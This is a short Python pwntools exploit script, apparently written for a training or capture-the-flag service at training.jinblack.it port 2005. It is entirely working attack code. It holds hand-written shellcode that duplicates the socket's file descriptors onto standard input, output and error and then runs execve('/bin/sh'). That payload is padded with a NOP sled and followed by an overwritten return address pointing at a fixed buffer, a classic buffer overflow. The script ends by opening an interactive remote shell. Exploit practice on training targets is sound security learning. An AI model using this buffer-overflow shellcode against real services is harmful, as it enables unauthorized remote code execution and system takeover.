import pwn

pwn.context.terminal = ['gnome-terminal', '-e']

# server = pwn.process('./server')

# pwn.gdb.attach(server, """set follow-fork-mode child
#     c
# """)

# input("wait")

# r = pwn.remote('0.0.0.0', 2005)

r = pwn.remote('training.jinblack.it', 2005)

buffer_addr = 0x004040c0

copy_std_fds = b'\x48\xC7\xC0\x20\x00\x00\x00\x48\xC7\xC7\x00\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\xFF\xCF\x48\xC7\xC0\x21\x00\x00\x00\x48\xC7\xC6\x00\x00\x00\x00\x0F\x05\x48\xC7\xC0\x21\x00\x00\x00\x48\xC7\xC6\x01\x00\x00\x00\x0F\x05\x48\xC7\xC0\x21\x00\x00\x00\x48\xC7\xC6\x02\x00\x00\x00\x0F\x05'

open_shell = b'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'

shell_code = copy_std_fds + open_shell

r.send(shell_code.ljust(1016, b'\x90') + pwn.p64(buffer_addr))

r.interactive()